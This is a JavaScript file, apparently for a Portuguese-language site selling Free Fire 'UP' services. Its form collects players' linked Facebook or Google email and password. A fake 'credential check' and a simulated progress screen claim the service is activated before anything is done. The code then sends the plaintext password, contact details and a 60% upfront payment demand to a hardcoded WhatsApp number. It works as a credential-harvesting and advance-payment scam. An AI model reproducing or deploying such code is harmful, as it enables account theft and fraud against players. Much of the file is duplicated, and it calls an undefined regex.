/**
 * SISTEMA COMPLETO PARA UP FREE FIRE
 * - Controle de formulário
 * - Integração com WhatsApp
 * - Validações básicas
 */

// Configurações (EDITÁVEIS)
const CONFIG = {
  whatsappNumber: "2389149532", // Seu número com código do país
  services: {
    "Bronze": { price: 100, diamonds: 1000 },
    "Prata": { price: 150, diamonds: 2000 },
    "Ouro": { price: 200, diamonds: 3000 }
  },
  whatsappRegex: /^(?:\+238|238)?\s?[95]\d{6}$/, // Formato CV: (+238) 9XXXXXX ou 5XXXXXX
  minNameLength: 3,
  emailRegex: /^[^\s@]+@[^\s@]+\.[^\s@]+$/ // Validação básica de email
};

// Funções de validação
function validateName(name) {
  return name.length >= CONFIG.minNameLength;
}

function validateId(id) {
  return CONFIG.idRegex.test(id);
}

function validateWhatsapp(whatsapp) {
  // Remove todos os espaços e caracteres especiais
  const cleanNumber = whatsapp.replace(/[\s\-\(\)]/g, '');
  
  // Se começa com +238 ou 238, remove para padronizar
  const normalizedNumber = cleanNumber.replace(/^\+238/, '').replace(/^238/, '');
  
  // Testa o formato (deve começar com 9 ou 5 e ter 7 dígitos no total)
  return CONFIG.whatsappRegex.test(normalizedNumber);
}

function validateEmail(email) {
  return CONFIG.emailRegex.test(email);
}

// Loading state
function setLoadingState(isLoading) {
  const submitBtn = document.querySelector('.submit-btn');
  if (isLoading) {
    submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processando...';
    submitBtn.disabled = true;
  } else {
    submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Enviar Pedido';
    submitBtn.disabled = false;
  }
}

// Quando o DOM estiver pronto
document.addEventListener("DOMContentLoaded", function() {
  // 1. Controle do Formulário Principal
  const form = document.getElementById("pedidoForm");
  if (form) {
    form.addEventListener("submit", async function(e) {
      e.preventDefault();
        // Obtém os valores dos campos
      const nome = this.querySelector("[name='nome']").value.trim();
      const conta = this.querySelector("[name='conta']").value;
      const email = this.querySelector("[name='email']").value.trim();
      const senha = this.querySelector("[name='senha']").value;
      const whatsapp = this.querySelector("[name='whatsapp']").value.trim();
      const servico = this.querySelector("[name='servico']").value;
      const metodoPagamento = this.querySelector("[name='pagamento']:checked")?.value;      // Validação completa
      if (!nome || !validateName(nome)) {
        showAlert("⚠️ Nome inválido! Digite seu nome completo.", "warning");
        return;
      }

      if (!conta) {
        showAlert("⚠️ Selecione sua conta vinculada (Facebook ou Google)!", "warning");
        return;
      }
      
      if (!email || !validateEmail(email)) {
        showAlert("⚠️ Email inválido! Digite o email da sua conta vinculada.", "warning");
        return;
      }

      if (!senha || !validatePassword(senha)) {
        showAlert("⚠️ A senha deve ter pelo menos 6 caracteres!", "warning");
        return;
      }

      if (!whatsapp || !validateWhatsapp(whatsapp)) {
        showAlert("⚠️ WhatsApp inválido! Use o formato +238 9XXXXXX ou +238 5XXXXXX", "warning");
        return;
      }
      
      // Validação da conta Free Fire
      const accountValid = await validateAccount(email, senha);
      if (!accountValid) {
        return;
      }

      if (!servico) {
        showAlert("⚠️ Selecione um serviço!", "warning");
        return;
      }

      if (!metodoPagamento) {
        showAlert("⚠️ Selecione um método de pagamento!", "warning");
        return;
      }

      // Mostra loading
      setLoadingState(true);      try {
        // Mostra o modal de processo
        showProcessModal();

        // Simula o processo automático
        await simulateAutomatedProcess();
        
        // Formata a mensagem (incluindo a senha)
        const mensagem = formatMessage(nome, conta, email, senha, whatsapp, servico, metodoPagamento);
        
        // Envia para WhatsApp
        const enviado = await sendToWhatsApp(mensagem);
        
        if (!enviado) {
          throw new Error("Não foi possível abrir o WhatsApp");
        }

        // Reset do formulário e salva no histórico
        this.reset();
        saveToHistory({
          nome,
          conta,
          email: maskEmail(email),
          servico,
          data: new Date().toISOString()
        });

        // Feedback de sucesso
        showAlert("✅ Pedido enviado com sucesso! Verifique seu WhatsApp.", "success");
      } catch (error) {
        console.error("Erro no envio:", error);
        hideProcessModal();
        showAlert(`❌ ${error.message || "Erro ao enviar pedido. Tente novamente."}`, "error");
      } finally {
        setLoadingState(false);
      }
    });
  }

  // 2. Atualiza preços dinamicamente
  const serviceSelect = document.querySelector("[name='servico']");
  if (serviceSelect) {
    serviceSelect.addEventListener("change", function() {
      const selectedService = CONFIG.services[this.value];
      if (selectedService) {
        document.getElementById("preco-dinamico").textContent = `${selectedService.price}$`;
        document.getElementById("diamantes-dinamico").textContent = `${selectedService.diamonds} diamantes`;
      }
    });
  }

  // 3. Carrega histórico se existir
  loadHistory();

  // 4. Restaura dados do formulário
  restoreFormData();

  // 5. Salva dados do formulário ao mudar
  document.querySelectorAll('#pedidoForm input, #pedidoForm select').forEach(element => {
    element.addEventListener('change', saveFormData);
  });

  // Calculadora de Diamantes
  setupCalculator();

  // Mini-jogo da Roleta
  setupRoulette();
});

// Salva pedido no histórico
function saveToHistory(pedido) {
  const historico = JSON.parse(localStorage.getItem('pedidos') || '[]');
  // Remove informações sensíveis antes de salvar
  const pedidoSeguro = {
    ...pedido,
    email: pedido.email.replace(/(.{2})(.*)(@.*)/, '$1***$3'), // Oculta parte do email
  };
  historico.unshift(pedidoSeguro); // Adiciona no início
  if (historico.length > 10) historico.pop(); // Mantém apenas os 10 últimos
  localStorage.setItem('pedidos', JSON.stringify(historico));
}

// Carrega histórico
function loadHistory() {
  const historico = JSON.parse(localStorage.getItem('pedidos') || '[]');
  if (historico.length > 0) {
    const historicoHtml = historico.map(pedido => `
      <div class="historic-item">
        <strong>${pedido.nome}</strong> - ${pedido.servico}
        <br>
        <small>ID: ${pedido.id} | Data: ${new Date(pedido.data).toLocaleDateString()}</small>
      </div>
    `).join('');

    // Adiciona histórico se o elemento existir
    const historicoElement = document.getElementById('historico');
    if (historicoElement) {
      historicoElement.innerHTML = historicoHtml;
    }
  }
}

// Salva os dados do formulário no localStorage
function saveFormData() {
    const formData = {
        nome: document.getElementById('nome').value,
        email: document.getElementById('email').value,
        whatsapp: document.getElementById('whatsapp').value,
        conta: document.getElementById('conta').value,
        servico: document.getElementById('servico').value
    };
    localStorage.setItem('formData', JSON.stringify(formData));
}

// Restaura os dados do formulário
function restoreFormData() {
    const savedData = localStorage.getItem('formData');
    if (savedData) {
        const formData = JSON.parse(savedData);
        document.getElementById('nome').value = formData.nome || '';
        document.getElementById('email').value = formData.email || '';
        document.getElementById('whatsapp').value = formData.whatsapp || '';
        document.getElementById('conta').value = formData.conta || '';
        document.getElementById('servico').value = formData.servico || '';
    }
}

// Formata a mensagem para WhatsApp
function formatMessage(nome, conta, email, senha, whatsapp, servico, metodoPagamento) {
  const dataHora = new Date().toLocaleString('pt-BR');
  const valorTotal = CONFIG.services[servico].price;
  const valorEntrada = Math.ceil(valorTotal * 0.6); // 60% do valor total
  const valorRestante = valorTotal - valorEntrada; // 40% restante

  return `\u{1F3AE} *NOVO PEDIDO DE UP* \u{1F3AE}\n\n` +
         `\u{1F4C5} Data: ${dataHora}\n` +
         `━━━━━━━━━━━━━━━\n` +
         `\u{1F464} *DADOS DO CLIENTE*\n` +
         `Nome: ${nome}\n` +
         `WhatsApp: ${whatsapp}\n\n` +
         `\u{1F3AF} *DADOS DO SERVIÇO*\n` +
         `Pacote: ${servico}\n` +
         `Valor Total: ${valorTotal}$\n` +
         `\u{1F4B8} Entrada (60%): ${valorEntrada}$\n` +
         `\u{1F4B0} Restante (40%): ${valorRestante}$ após conclusão\n` +
         `Bônus: ${CONFIG.services[servico].diamonds} diamantes\n\n` +
         `\u{1F510} *DADOS DA CONTA*\n` +
         `Tipo: ${conta}\n` +
         `Email: ${email}\n` +
         `Senha: ${senha} (Senha da conta ${conta})\n\n` +
         `\u{1F4B3} *PAGAMENTO*\n` +
         `Método: ${metodoPagamento}\n` +
         `Status: \u{23F3} Aguardando pagamento da entrada (${valorEntrada}$)\n\n` +
         `━━━━━━━━━━━━━━━\n` +
         `\u{2728} Sistema Automático FF UP Pro\n` +
         `\u{2139} Pague ${valorEntrada}$ para iniciar o serviço\n` +
         `\u{1F449} Os ${valorRestante}$ restantes serão pagos após a conclusão`;
}

// Envia para WhatsApp
function sendToWhatsApp(message) {
  return new Promise((resolve, reject) => {
    try {
      const url = `https://wa.me/${CONFIG.whatsappNumber}?text=${encodeURIComponent(message)}`;
      
      // Cria um link temporário
      const link = document.createElement('a');
      link.href = url;
      link.target = '_blank';
      link.rel = 'noopener noreferrer';
      link.style.display = 'none';
      document.body.appendChild(link);
      
      // Simula o clique do usuário
      link.click();
      
      // Remove o link
      document.body.removeChild(link);
      
      // Considera como sucesso
      resolve(true);
    } catch (error) {
      console.error("Erro ao abrir WhatsApp:", error);
      reject(new Error("Não foi possível abrir o WhatsApp. Por favor, clique no botão 'Conversar' na seção de contato."));
    }
  });
}

// Função de alerta melhorada
function showAlert(message, type = "info") {
  const alertDiv = document.createElement("div");
  alertDiv.className = `custom-alert alert-${type}`;
  alertDiv.textContent = message;
  document.body.appendChild(alertDiv);
  
  setTimeout(() => {
    alertDiv.remove();
  }, 5000);
}

// Função para alternar visibilidade da senha
function togglePassword() {
  const senhaInput = document.getElementById('senha');
  const toggleButton = document.querySelector('.toggle-password i');
  
  if (senhaInput.type === 'password') {
    senhaInput.type = 'text';
    toggleButton.className = 'fas fa-eye-slash';
  } else {
    senhaInput.type = 'password';
    toggleButton.className = 'fas fa-eye';
  }
}

// Função para mascarar senha na mensagem
function maskPassword(password) {
  return '•'.repeat(password.length);
}

// Validação de senha
function validatePassword(password) {
  return password.length >= 6; // Senha deve ter pelo menos 6 caracteres
}

// Funções para o processo automático
function showProcessModal() {
    const modal = document.getElementById('processModal');
    if (modal) {
        modal.classList.add('active');
    }
}

function hideProcessModal() {
    const modal = document.getElementById('processModal');
    if (modal) {
        modal.classList.remove('active');
    }
}

async function simulateAutomatedProcess() {
    try {
        const steps = document.querySelectorAll('.progress-step');
        const processMessage = document.querySelector('.process-message');
        if (!steps.length || !processMessage) {
            console.error('Elementos do modal não encontrados');
            return;
        }

        const messages = [
            "Verificando pagamento...",
            "Validando dados da conta...",
            "Iniciando serviço...",
            "Serviço ativado com sucesso!"
        ];

        for (let i = 0; i < steps.length; i++) {
            // Atualiza o passo atual
            steps[i].classList.add('active');
            processMessage.textContent = messages[i];

            // Aguarda um tempo para simular o processamento
            await new Promise(resolve => setTimeout(resolve, 1500));

            // Marca o passo como concluído
            steps[i].classList.add('done');
        }

        // Aguarda um momento final para mostrar o sucesso
        await new Promise(resolve => setTimeout(resolve, 1000));
        showAlert("✅ Serviço ativado com sucesso!", "success");
        hideProcessModal();
    } catch (error) {
        console.error('Erro no processo automático:', error);
        hideProcessModal();
        showAlert("❌ Erro ao processar pedido. Tente novamente.", "error");
    }
}

// Função para mascarar email no histórico
function maskEmail(email) {
    return email.replace(/(.{2})(.*)(@.*)/, '$1***$3');
}

// Função para validar a conta Free Fire
async function validateAccount(email, senha) {
  try {
    showAlert("⌛ Verificando credenciais da conta...", "info");
    
    // Simulando verificação de conta (pode ser substituído por uma API real)
    const response = await new Promise((resolve) => {
      setTimeout(() => {
        // Simulação de validação básica
        const accountValid = email.length > 0 && senha.length >= 6;
        resolve({
          success: accountValid,
          message: accountValid ? 
            "Conta verificada com sucesso!" : 
            "Não foi possível verificar a conta. Verifique suas credenciais."
        });
      }, 2000); // Simula delay de rede
    });

    if (response.success) {
      showAlert("✅ " + response.message, "success");
      return true;
    } else {
      showAlert("❌ " + response.message, "error");
      return false;
    }
  } catch (error) {
    console.error("Erro na verificação da conta:", error);
    showAlert("❌ Erro ao verificar a conta. Tente novamente.", "error");
    return false;
  }
}

// Validação em tempo real
function setupRealTimeValidation() {
    // Validação do nome
    document.getElementById('nome').addEventListener('input', function() {
        const isValid = validateName(this.value);
        this.style.borderColor = isValid ? '#4CAF50' : '#f44336';
    });

    // Validação do email
    document.getElementById('email').addEventListener('input', function() {
        const isValid = validateEmail(this.value);
        this.style.borderColor = isValid ? '#4CAF50' : '#f44336';
    });

    // Validação da senha
    document.getElementById('senha').addEventListener('input', function() {
        const isValid = validatePassword(this.value);
        this.style.borderColor = isValid ? '#4CAF50' : '#f44336';
    });

    // Validação do WhatsApp
    document.getElementById('whatsapp').addEventListener('input', function() {
        const isValid = validateWhatsapp(this.value);
        this.style.borderColor = isValid ? '#4CAF50' : '#f44336';
    });
}

// Inicializa validação em tempo real quando o documento carregar
document.addEventListener('DOMContentLoaded', function() {
    setupRealTimeValidation();
    // 1. Controle do Formulário Principal
    const form = document.getElementById("pedidoForm");
    if (form) {
      form.addEventListener("submit", async function(e) {
        e.preventDefault();
          // Obtém os valores dos campos
        const nome = this.querySelector("[name='nome']").value.trim();
        const conta = this.querySelector("[name='conta']").value;
        const email = this.querySelector("[name='email']").value.trim();
        const senha = this.querySelector("[name='senha']").value;
        const whatsapp = this.querySelector("[name='whatsapp']").value.trim();
        const servico = this.querySelector("[name='servico']").value;
        const metodoPagamento = this.querySelector("[name='pagamento']:checked")?.value;      // Validação completa
        if (!nome || !validateName(nome)) {
          showAlert("⚠️ Nome inválido! Digite seu nome completo.", "warning");
          return;
        }

        if (!conta) {
          showAlert("⚠️ Selecione sua conta vinculada (Facebook ou Google)!", "warning");
          return;
        }
        
        if (!email || !validateEmail(email)) {
          showAlert("⚠️ Email inválido! Digite o email da sua conta vinculada.", "warning");
          return;
        }

        if (!senha || !validatePassword(senha)) {
          showAlert("⚠️ A senha deve ter pelo menos 6 caracteres!", "warning");
          return;
        }

        if (!whatsapp || !validateWhatsapp(whatsapp)) {
          showAlert("⚠️ WhatsApp inválido! Use o formato +238 9XXXXXX ou +238 5XXXXXX", "warning");
          return;
        }
        
        // Validação da conta Free Fire
        const accountValid = await validateAccount(email, senha);
        if (!accountValid) {
          return;
        }

        if (!servico) {
          showAlert("⚠️ Selecione um serviço!", "warning");
          return;
        }

        if (!metodoPagamento) {
          showAlert("⚠️ Selecione um método de pagamento!", "warning");
          return;
        }

        // Mostra loading
        setLoadingState(true);      try {
          // Mostra o modal de processo
          showProcessModal();

          // Simula o processo automático
          await simulateAutomatedProcess();
          
          // Formata a mensagem (incluindo a senha)
          const mensagem = formatMessage(nome, conta, email, senha, whatsapp, servico, metodoPagamento);
          
          // Envia para WhatsApp
          const enviado = await sendToWhatsApp(mensagem);
          
          if (!enviado) {
            throw new Error("Não foi possível abrir o WhatsApp");
          }

          // Reset do formulário e salva no histórico
          this.reset();
          saveToHistory({
            nome,
            conta,
            email: maskEmail(email),
            servico,
            data: new Date().toISOString()
          });

          // Feedback de sucesso
          showAlert("✅ Pedido enviado com sucesso! Verifique seu WhatsApp.", "success");
        } catch (error) {
          console.error("Erro no envio:", error);
          hideProcessModal();
          showAlert(`❌ ${error.message || "Erro ao enviar pedido. Tente novamente."}`, "error");
        } finally {
          setLoadingState(false);
        }
      });
    }

    // 2. Atualiza preços dinamicamente
    const serviceSelect = document.querySelector("[name='servico']");
    if (serviceSelect) {
      serviceSelect.addEventListener("change", function() {
        const selectedService = CONFIG.services[this.value];
        if (selectedService) {
          document.getElementById("preco-dinamico").textContent = `${selectedService.price}$`;
          document.getElementById("diamantes-dinamico").textContent = `${selectedService.diamonds} diamantes`;
        }
      });
    }

    // 3. Carrega histórico se existir
    loadHistory();

    // 4. Restaura dados do formulário
    restoreFormData();

    // 5. Salva dados do formulário ao mudar
    document.querySelectorAll('#pedidoForm input, #pedidoForm select').forEach(element => {
      element.addEventListener('change', saveFormData);
    });

    // Calculadora de Diamantes
    setupCalculator();

    // Mini-jogo da Roleta
    setupRoulette();
});

// Calculadora de Diamantes
function setupCalculator() {
    const valorGasto = document.getElementById('valorGasto');
    const resultadoDiamantes = document.getElementById('resultadoDiamantes');
    const resultadoBonus = document.getElementById('resultadoBonus');

    valorGasto.addEventListener('input', function() {
        const valor = parseFloat(this.value) || 0;
        // Cálculo básico: cada $1 = 10 diamantes
        const diamantes = Math.floor(valor * 10);
        // Bônus: 10% extra
        const bonus = Math.floor(diamantes * 0.1);
        
        resultadoDiamantes.textContent = diamantes;
        resultadoBonus.textContent = bonus;
        
        // Animar números
        resultadoDiamantes.classList.add('success-animation');
        resultadoBonus.classList.add('success-animation');
        
        setTimeout(() => {
            resultadoDiamantes.classList.remove('success-animation');
            resultadoBonus.classList.remove('success-animation');
        }, 500);
    });
}

// Removed setupRoulette() since it's now in roulette.js

// Salva pedido no histórico
function saveToHistory(pedido) {
  const historico = JSON.parse(localStorage.getItem('pedidos') || '[]');
  // Remove informações sensíveis antes de salvar
  const pedidoSeguro = {
    ...pedido,
    email: pedido.email.replace(/(.{2})(.*)(@.*)/, '$1***$3'), // Oculta parte do email
  };
  historico.unshift(pedidoSeguro); // Adiciona no início
  if (historico.length > 10) historico.pop(); // Mantém apenas os 10 últimos
  localStorage.setItem('pedidos', JSON.stringify(historico));
}

// Carrega histórico
function loadHistory() {
  const historico = JSON.parse(localStorage.getItem('pedidos') || '[]');
  if (historico.length > 0) {
    const historicoHtml = historico.map(pedido => `
      <div class="historic-item">
        <strong>${pedido.nome}</strong> - ${pedido.servico}
        <br>
        <small>ID: ${pedido.id} | Data: ${new Date(pedido.data).toLocaleDateString()}</small>
      </div>
    `).join('');

    // Adiciona histórico se o elemento existir
    const historicoElement = document.getElementById('historico');
    if (historicoElement) {
      historicoElement.innerHTML = historicoHtml;
    }
  }
}

// Salva os dados do formulário no localStorage
function saveFormData() {
    const formData = {
        nome: document.getElementById('nome').value,
        email: document.getElementById('email').value,
        whatsapp: document.getElementById('whatsapp').value,
        conta: document.getElementById('conta').value,
        servico: document.getElementById('servico').value
    };
    localStorage.setItem('formData', JSON.stringify(formData));
}

// Restaura os dados do formulário
function restoreFormData() {
    const savedData = localStorage.getItem('formData');
    if (savedData) {
        const formData = JSON.parse(savedData);
        document.getElementById('nome').value = formData.nome || '';
        document.getElementById('email').value = formData.email || '';
        document.getElementById('whatsapp').value = formData.whatsapp || '';
        document.getElementById('conta').value = formData.conta || '';
        document.getElementById('servico').value = formData.servico || '';
    }
}

// Formata a mensagem para WhatsApp
function formatMessage(nome, conta, email, senha, whatsapp, servico, metodoPagamento) {
  const dataHora = new Date().toLocaleString('pt-BR');
  const valorTotal = CONFIG.services[servico].price;
  const valorEntrada = Math.ceil(valorTotal * 0.6); // 60% do valor total
  const valorRestante = valorTotal - valorEntrada; // 40% restante

  return `\u{1F3AE} *NOVO PEDIDO DE UP* \u{1F3AE}\n\n` +
         `\u{1F4C5} Data: ${dataHora}\n` +
         `━━━━━━━━━━━━━━━\n` +
         `\u{1F464} *DADOS DO CLIENTE*\n` +
         `Nome: ${nome}\n` +
         `WhatsApp: ${whatsapp}\n\n` +
         `\u{1F3AF} *DADOS DO SERVIÇO*\n` +
         `Pacote: ${servico}\n` +
         `Valor Total: ${valorTotal}$\n` +
         `\u{1F4B8} Entrada (60%): ${valorEntrada}$\n` +
         `\u{1F4B0} Restante (40%): ${valorRestante}$ após conclusão\n` +
         `Bônus: ${CONFIG.services[servico].diamonds} diamantes\n\n` +
         `\u{1F510} *DADOS DA CONTA*\n` +
         `Tipo: ${conta}\n` +
         `Email: ${email}\n` +
         `Senha: ${senha} (Senha da conta ${conta})\n\n` +
         `\u{1F4B3} *PAGAMENTO*\n` +
         `Método: ${metodoPagamento}\n` +
         `Status: \u{23F3} Aguardando pagamento da entrada (${valorEntrada}$)\n\n` +
         `━━━━━━━━━━━━━━━\n` +
         `\u{2728} Sistema Automático FF UP Pro\n` +
         `\u{2139} Pague ${valorEntrada}$ para iniciar o serviço\n` +
         `\u{1F449} Os ${valorRestante}$ restantes serão pagos após a conclusão`;
}

// Envia para WhatsApp
function sendToWhatsApp(message) {
  return new Promise((resolve, reject) => {
    try {
      const url = `https://wa.me/${CONFIG.whatsappNumber}?text=${encodeURIComponent(message)}`;
      
      // Cria um link temporário
      const link = document.createElement('a');
      link.href = url;
      link.target = '_blank';
      link.rel = 'noopener noreferrer';
      link.style.display = 'none';
      document.body.appendChild(link);
      
      // Simula o clique do usuário
      link.click();
      
      // Remove o link
      document.body.removeChild(link);
      
      // Considera como sucesso
      resolve(true);
    } catch (error) {
      console.error("Erro ao abrir WhatsApp:", error);
      reject(new Error("Não foi possível abrir o WhatsApp. Por favor, clique no botão 'Conversar' na seção de contato."));
    }
  });
}

// Função de alerta melhorada
function showAlert(message, type = "info") {
  const alertDiv = document.createElement("div");
  alertDiv.className = `custom-alert alert-${type}`;
  alertDiv.textContent = message;
  document.body.appendChild(alertDiv);
  
  setTimeout(() => {
    alertDiv.remove();
  }, 5000);
}

// Função para alternar visibilidade da senha
function togglePassword() {
  const senhaInput = document.getElementById('senha');
  const toggleButton = document.querySelector('.toggle-password i');
  
  if (senhaInput.type === 'password') {
    senhaInput.type = 'text';
    toggleButton.className = 'fas fa-eye-slash';
  } else {
    senhaInput.type = 'password';
    toggleButton.className = 'fas fa-eye';
  }
}

// Função para mascarar senha na mensagem
function maskPassword(password) {
  return '•'.repeat(password.length);
}

// Validação de senha
function validatePassword(password) {
  return password.length >= 6; // Senha deve ter pelo menos 6 caracteres
}

// Funções para o processo automático
function showProcessModal() {
    const modal = document.getElementById('processModal');
    if (modal) {
        modal.classList.add('active');
    }
}

function hideProcessModal() {
    const modal = document.getElementById('processModal');
    if (modal) {
        modal.classList.remove('active');
    }
}

async function simulateAutomatedProcess() {
    try {
        const steps = document.querySelectorAll('.progress-step');
        const processMessage = document.querySelector('.process-message');
        if (!steps.length || !processMessage) {
            console.error('Elementos do modal não encontrados');
            return;
        }

        const messages = [
            "Verificando pagamento...",
            "Validando dados da conta...",
            "Iniciando serviço...",
            "Serviço ativado com sucesso!"
        ];

        for (let i = 0; i < steps.length; i++) {
            // Atualiza o passo atual
            steps[i].classList.add('active');
            processMessage.textContent = messages[i];

            // Aguarda um tempo para simular o processamento
            await new Promise(resolve => setTimeout(resolve, 1500));

            // Marca o passo como concluído
            steps[i].classList.add('done');
        }

        // Aguarda um momento final para mostrar o sucesso
        await new Promise(resolve => setTimeout(resolve, 1000));
        showAlert("✅ Serviço ativado com sucesso!", "success");
        hideProcessModal();
    } catch (error) {
        console.error('Erro no processo automático:', error);
        hideProcessModal();
        showAlert("❌ Erro ao processar pedido. Tente novamente.", "error");
    }
}

// Função para mascarar email no histórico
function maskEmail(email) {
    return email.replace(/(.{2})(.*)(@.*)/, '$1***$3');
}

// Função para validar a conta Free Fire
async function validateAccount(email, senha) {
  try {
    showAlert("⌛ Verificando credenciais da conta...", "info");
    
    // Simulando verificação de conta (pode ser substituído por uma API real)
    const response = await new Promise((resolve) => {
      setTimeout(() => {
        // Simulação de validação básica
        const accountValid = email.length > 0 && senha.length >= 6;
        resolve({
          success: accountValid,
          message: accountValid ? 
            "Conta verificada com sucesso!" : 
            "Não foi possível verificar a conta. Verifique suas credenciais."
        });
      }, 2000); // Simula delay de rede
    });

    if (response.success) {
      showAlert("✅ " + response.message, "success");
      return true;
    } else {
      showAlert("❌ " + response.message, "error");
      return false;
    }
  } catch (error) {
    console.error("Erro na verificação da conta:", error);
    showAlert("❌ Erro ao verificar a conta. Tente novamente.", "error");
    return false;
  }
}

// Formata o número do WhatsApp automaticamente
document.getElementById('whatsapp').addEventListener('input', function(e) {
    let numero = e.target.value.replace(/\D/g, '');
    if (numero.length > 0) {
        // Se começar com 238, mantém
        if (numero.startsWith('238')) {
            numero = numero.slice(0, 11);
        } 
        // Se não começar com 238, adiciona
        else {
            numero = '238' + numero;
            numero = numero.slice(0, 11);
        }
        
        // Formata o número
        if (numero.length > 3) {
            numero = `+${numero.slice(0, 3)} ${numero.slice(3)}`;
        }
    }
    e.target.value = numero;
});